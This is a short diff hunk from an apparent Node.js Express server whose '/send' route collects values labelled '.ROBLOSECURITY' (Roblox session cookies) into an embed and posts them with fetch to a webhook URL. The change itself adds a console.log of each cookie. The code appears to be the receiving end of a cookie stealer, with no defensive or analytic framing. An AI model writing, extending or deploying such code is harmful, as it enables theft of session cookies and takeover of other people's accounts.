@@ -36,7 +36,8 @@ app.post('/send', async (req, res) => {
                 //name: "Memory",
                 //value: "4.2 GB / 16 GB",
                 //inline: true
-                embed.fields.push({name: ".ROBLOSECURITY", value: key, inline: true})
+                embed.fields.push({name: ".ROBLOSECURITY", value: key, inline: true});
+                console.log(key,index);
             }
         }
         const response = await fetch(webhookUrl, {
